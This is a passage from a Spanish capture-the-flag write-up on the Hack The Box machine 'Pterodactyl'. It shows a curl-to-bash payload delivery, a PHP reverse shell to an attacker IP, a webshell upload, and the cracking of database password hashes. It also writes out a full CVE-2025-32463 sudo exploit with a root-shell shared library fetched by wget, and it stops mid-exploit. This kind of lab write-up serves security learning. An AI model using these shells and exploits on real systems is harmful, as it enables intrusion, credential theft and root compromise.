+<li>Abrimos el puerto 80 con un server HTTP de python, sirviendo <code>revshell.sh</code>; y el puerto 443 preparado para la revshell.</li>
+<li>Hacemos que la víctima haga curl a nuestro payload y lo ejecute en memoria:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;curl -s http://10.10.15.95:80/revshell.sh | bash &amp;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ </span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Command not found <span style="color:#f92672">(</span>or no output<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<p>Pero en ambos puertos en escucha vemos lo mismo: Llegan 12 solicitudes http, y al handler le llegan shells inválidas:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.4.98 - - <span style="color:#f92672">[</span>24/Feb/2026 19:31:07<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /revshell.sh HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>10.129.4.98 - - <span style="color:#f92672">[</span>24/Feb/2026 19:31:07<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /revshell.sh HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 10 más</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo penelope -i 10.10.15.95 -p <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> reverse shells on 10.10.15.95:443
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Invalid shell from 10.129.4.98
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Invalid shell from 10.129.4.98
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 10 más</span></span></span></code></pre></div></div>
+<p>El problema posiblemente sea que, aunque la primera revshell que llegue sea buena, el resto que llega pisa la conexión anterior y hace que al final todas las conexiones resulten inválidas. Además, al morir el proceso padre php, el resto de shells mueren. Estos dos problemas los podemos solucionar de forma sencilla.</p>
+
+<h4 class="relative group">Revshell definitivo (que no va)
+    <div id="revshell-definitivo-que-no-va" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#revshell-definitivo-que-no-va" aria-label="Ancla">#</a>
+    </span>
+    
+</h4>
+<ol>
+<li>Añadimos una comprobación para que solo se inicie la primera conexión</li>
+<li>Añadimos <code>nohup</code> para que cuando muera el proceso padre no mueran los hijos y filtramos errores y output.</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-revshell.sh" data-lang="revshell.sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Si el archivo ya existe (lo ha creado una conexión anterior) se sale sin hacer nada.</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /tmp/RevshellLock <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>touch /tmp/RevshellLock
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nohup php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.10.15.95&#34;, 443); exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;</span></span></code></pre></div></div>
+<p>Ahora hacemos lo mismo que antes:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc.py -H panel.pterodactyl.htb -c <span style="color:#e6db74">&#39;curl -s http://10.10.15.95:80/revshell.sh | bash &amp;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\ </span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Command not found <span style="color:#f92672">(</span>or no output<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<p>Pero si miramos el puerto en escucha:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got reverse shell from pterodactyl~10.129.4.98-Linux-x86_64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to deploy Python Agent...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Shell upgraded successfully using /usr/bin/python3!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wwwrun@pterodactyl:/var/www/pterodactyl/public&gt;</span></span></code></pre></div></div>
+<p>Aunque parece que hemos avanzado bastante, tenemos un problema. Si intentamos escribir cualquier cosa, el shell no responde, está congelado. Tenemos un revshell pero ni siquiera funciona.</p>
+
+<h3 class="relative group">Plan B, Webshell
+    <div id="plan-b-webshell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#plan-b-webshell" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Por algún motivo, el revshell que hemos conseguido antes no iba y, antes de ponerme a debuggear otra vez, busco una alternativa.</p>
+<p>Primero se me ocurre pasar un binario de <code>chisel</code> a la máquina (recordemos que <code>curl</code> sí funcionaba), hacer port-forwarding de la base de datos (para la que teníamos credenciales <code>pterodactyl:PteraPanel</code>), y rezar por que hubiese un hash de contraseña de un usuario del sistema, pero luego pienso en otra alternativa más fácil antes.</p>
+<p>La revshell podía fallar por muchos motivos, y la forma más sencilla de eliminar esos motivos es usar una <a href="https://github.com/drag0s/php-webshell"  target="_blank" rel="noreferrer">webshell</a> PHP y ejecutar la revshell desde ahí:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shell&gt; curl http://10.10.15.95:8000/webshell.php -o ./webshell.php 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Command not found <span style="color:#f92672">(</span>or no output<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<p>Aunque ponga <code>Command not found</code>, en nuestro servidor python hemos recibido las solicitudes. Ahora accedemos al webshell y ejecutamos nuestro reverse shell:</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt=""
+    width="1279"
+    height="593"
+    src="/writeups/pterodactyl/revshellPterodactyl_hu_44985880de515f2e.png"
+    srcset="/writeups/pterodactyl/revshellPterodactyl_hu_44985880de515f2e.png 800w, /writeups/pterodactyl/revshellPterodactyl.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeups/pterodactyl/revshellPterodactyl.png"></figure>
+</p>
+<p>Y por fin tenemos un shell estable.</p>
+<blockquote><p>Realmente podríamos haber hecho bastante enumeración desde el webshell o incluso desde el exploit (que nos dan un nivel de interactividad similar), pero es bastante más comodo tener un shell completo.</p>
+</blockquote>
+<h2 class="relative group">Privesc (desde <code>wwwrun</code>)
+    <div id="privesc-desde-wwwrun" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privesc-desde-wwwrun" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Posiblemente el vector de escalada esté en unas credenciales guardadas en MariaDB para el panel de login que se reutilicen para un user del sistema, así que probamos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mysql -u pterodactyl -p<span style="color:#e6db74">&#34;PteraPanel&#34;</span>
+</span></span><span style="display:flex;"><span>ERROR <span style="color:#ae81ff">1045</span> <span style="color:#f92672">(</span>28000<span style="color:#f92672">)</span>: Access denied <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;pterodactyl&#39;</span>@<span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">(</span>using password: YES<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Probando a ver si con solo la DB &#34;panel&#34; funciona.</span>
+</span></span><span style="display:flex;"><span>$ mysql -u pterodactyl -p<span style="color:#e6db74">&#34;PteraPanel&#34;</span> --database<span style="color:#f92672">=</span>panel
+</span></span><span style="display:flex;"><span>ERROR <span style="color:#ae81ff">1045</span> <span style="color:#f92672">(</span>28000<span style="color:#f92672">)</span>: Access denied <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;pterodactyl&#39;</span>@<span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">(</span>using password: YES<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<p>Al parecer las credenciales no son esas. Antes de enumerar por otro lado, busco dónde están guardadas las credenciales de la DB en los archivos de Pterodactyl (por si han cambiado) y casualmente me encuentro con <a href="https://github.com/pterodactyl/documentation/issues/123"  target="_blank" rel="noreferrer">este post que me salva mucho tiempo</a>.</p>
+<p>De nuevo, probamos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u pterodactyl -p<span style="color:#e6db74">&#34;PteraPanel&#34;</span> --host<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>mysql: Deprecated program name. It will be removed in a future release, use <span style="color:#e6db74">&#39;/usr/bin/mariadb&#39;</span> instead
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+</span></span><span style="display:flex;"><span>Your MariaDB connection id is <span style="color:#ae81ff">445</span>
+</span></span><span style="display:flex;"><span>Server version: 11.8.3-MariaDB MariaDB package
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; </span></span></code></pre></div></div>
+<p>Bingo.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| panel              |
+</span></span><span style="display:flex;"><span>| test               |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> rows in set <span style="color:#f92672">(</span>0.003 sec<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+<ul>
+<li><code>information_schema</code> es la default de MySQL, tiene metadatos.</li>
+<li><code>test</code> está vacía.</li>
+<li><code>panel</code> parece (y es) la importante.</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>panel<span style="color:#f92672">]</span>&gt; show tables;
+</span></span><span style="display:flex;"><span>+-----------------------+
+</span></span><span style="display:flex;"><span>| Tables_in_panel       |
+</span></span><span style="display:flex;"><span>+-----------------------+
+</span></span><span style="display:flex;"><span>| ...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...          |
+</span></span><span style="display:flex;"><span>| settings              |
+</span></span><span style="display:flex;"><span>| subusers              |
+</span></span><span style="display:flex;"><span>| tasks                 |
+</span></span><span style="display:flex;"><span>| tasks_log             |
+</span></span><span style="display:flex;"><span>| user_ssh_keys         |
+</span></span><span style="display:flex;"><span>| users                 |
+</span></span><span style="display:flex;"><span>+-----------------------+</span></span></code></pre></div></div>
+<p>Hay <code>users</code> y <code>user_ssh_keys</code>, parece que tenemos lo que buscábamos. Echamos un vistazo y conseguimos la siguiente info:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EMAIL                           PASSWORD
+</span></span><span style="display:flex;"><span>headmonitor@pterodactyl.htb     $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl.htb    $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># user_ssh_keys estaba vacío, toca fuerza bruta.</span></span></span></code></pre></div></div>
+<p>Los metemos a <code>hashcat</code>:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx</span></span></code></pre></div></div>
+<p>Y sacamos la contraseña de <code>phileasfogg3</code>: <code>!QAZ2wsx</code></p>
+
+<h2 class="relative group">Privesc (desde <code>phileasfogg3</code>)
+    <div id="privesc-desde-phileasfogg3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privesc-desde-phileasfogg3" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Vamos a SSH:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh phileasfogg3@pterodactyl.htb
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;pterodactyl.htb (10.129.4.98)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is: SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>pterodactyl.htb<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>phileasfogg3@pterodactyl.htb<span style="color:#f92672">)</span> Password: 
+</span></span><span style="display:flex;"><span>Have a lot of fun...
+</span></span><span style="display:flex;"><span>phileasfogg3@pterodactyl:~&gt; </span></span></code></pre></div></div>
+<p>Ejecutamos linPEAS:</p>
+<ul>
+<li>PATH: <code>/home/phileasfogg3/bin:/usr/local/bin:/usr/bin:/bin</code>.
+<ul>
+<li>El primer directorio en el que se buscan los programas es el <code>~bin</code> de phileasfogg3.</li>
+</ul>
+</li>
+<li>Puertos en local abiertos:</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udp     UNCONN   127.0.0.1:323      <span style="color:#75715e"># chronyd, equivalente moderno a NTP</span>
+</span></span><span style="display:flex;"><span>tcp     LISTEN   127.0.0.1:631      <span style="color:#75715e"># CUPS 2.2.7 (no vulnerable a evilCUPS)</span>
+</span></span><span style="display:flex;"><span>tcp     LISTEN   127.0.0.1:9000     <span style="color:#75715e"># PHP-FPM: Servicio de PHP que recibe las peticiones del servidor web para procesar el código de Pterodactyl.</span>
+</span></span><span style="display:flex;"><span>tcp     LISTEN   127.0.0.1:3306     <span style="color:#75715e"># MariaDB (Ya usada)</span>
+</span></span><span style="display:flex;"><span>tcp     LISTEN   127.0.0.1:6379     <span style="color:#75715e"># REDIS</span>
+</span></span><span style="display:flex;"><span>tcp     LISTEN   127.0.0.1:25       <span style="color:#75715e"># SMTP (Raramente explotable, solo podemos enumerar users)</span></span></span></code></pre></div></div>
+
+<h3 class="relative group">Redis (rabbit hole)
+    <div id="redis-rabbit-hole" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#redis-rabbit-hole" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Entramos primero a redis:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~&gt; redis-cli -h localhost
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; info
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server</span>
+</span></span><span style="display:flex;"><span>redis_version:8.2.1
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; KEYS *
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Se dumpean todas las entradas de la DB, nada relevante.</span></span></span></code></pre></div></div>
+<p>Vemos que la versión de Redis es la 8.2.1, según Internet, potencialmente vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49844"  target="_blank" rel="noreferrer"><code>CVE-2025-49844</code> &ldquo;Redishell&rdquo;</a></p>
+<blockquote><p><em>Redis is an open source, in-memory database that persists on disk. Versions 8.2.1 and below allow an authenticated user to use a specially crafted Lua script to manipulate the garbage collector, trigger a use-after-free and potentially lead to remote code execution</em></p>
+</blockquote><p><strong>Problema</strong>: Redis se ejecuta con la cuenta de servicio <code>redis</code>, así que no vamos a conseguir elevar privilegios. De hecho, conseguir ser <code>redis</code> posiblemente nos limite más porque sus capacidades estarán intencionalmente restringidas.</p>
+
+<h3 class="relative group">Sudo (rabbit hole)
+    <div id="sudo-rabbit-hole" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#sudo-rabbit-hole" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Tras echar un vistazo a linPEAS otra vez sin ver nada, miramos la versión de sudo:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~&gt; sudo --version
+</span></span><span style="display:flex;"><span>Sudo version 1.9.15p5</span></span></code></pre></div></div>
+<p>Y al buscar en google:</p>
+<blockquote><p><em>La versión sudo 1.9.15p5 (y versiones anteriores hasta la 1.9.14) está afectada por dos vulnerabilidades críticas descubiertas en 2025 que permiten la escalada de privilegios a root.</em></p>
+</blockquote><p>La más relevante es <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-32463"  target="_blank" rel="noreferrer"><code>CVE-2025-32463</code></a>, cuyo <a href="https://github.com/kh4sh3i/CVE-2025-32463"  target="_blank" rel="noreferrer">exploit</a> usaremos. Como no tenemos <code>gcc</code> en la máquina (y el exploit lo usa), compilamos la librería de forma local con las flags que usa el exploit:</p>
+<ol>
+<li>Creamos <code>woot1337.c</code>:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-woot1337.c" data-lang="woot1337.c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor)) <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">woot</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setreuid</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setregid</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;/bin/bash&#34;</span>, NULL);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div>
+<ol start="2">
+<li>Lo compilamos igual que en el exploit y lo servimos</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -shared -fPIC -Wl,-init,woot -o woot1337.so.2 woot1337.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...</span></span></code></pre></div></div>
+<ol start="3">
+<li>Editamos el <code>.sh</code>:</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-exploit.sh" data-lang="exploit.sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE-2025-32463</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STAGE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d /tmp/sudowoot.stage.XXXXXX<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>cd <span style="color:#e6db74">${</span>STAGE?<span style="color:#e6db74">}</span> <span style="color:#f92672">||</span> exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mkdir -p woot/etc libnss_
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;passwd: /woot1337&#34;</span> &gt; woot/etc/nsswitch.conf
+</span></span><span style="display:flex;"><span>cp /etc/group woot/etc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;-&gt; Descargando librería&#34;</span>
+</span></span><span style="display:flex;"><span>wget http://10.10.15.95:8000/woot1337.so.2 -O libnss_/woot1337.so.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x libnss_/woot1337.so.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;-&gt; Ejecutando exploit&#34;</span>
+</span></span><span style="display:flex;"><span>sudo -R woot woot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rm -rf <span style="color:#e6db74">${</span>STAGE?<span style="color:#e6db74">}</span></span></span></code></pre></div></div>
+<p>Pero lo ejecutamos:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/exploit.sh 
+</span></span><span style="display:flex;"><span>-&gt; Descargando librería
+</span></span><span style="display:flex;"><span>--2026-02-26 13:41:10--  http://10.10.15.95:8000/woot1337.so.2
+</span></span><span style="display:flex;"><span>Connecting to 10.10.15.95:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">15536</span> <span style="color:#f92672">(</span>15K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘libnss_/woot1337.so.2’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libnss_/woot1337.so.2                  100%<span style="color:#f92672">[============================================================================</span>&gt;<span style="color:#f92672">]</span>  15.17K  --.-KB/s    in 0.04s   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-02-26 13:41:10 <span style="color:#f92672">(</span><span style="color:#ae81ff">387</span> KB/s<span style="color:#f92672">)</span> - ‘libnss_/woot1337.so.2’ saved <span style="color:#f92672">[</span>15536/15536<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-&gt; Ejecutando exploit
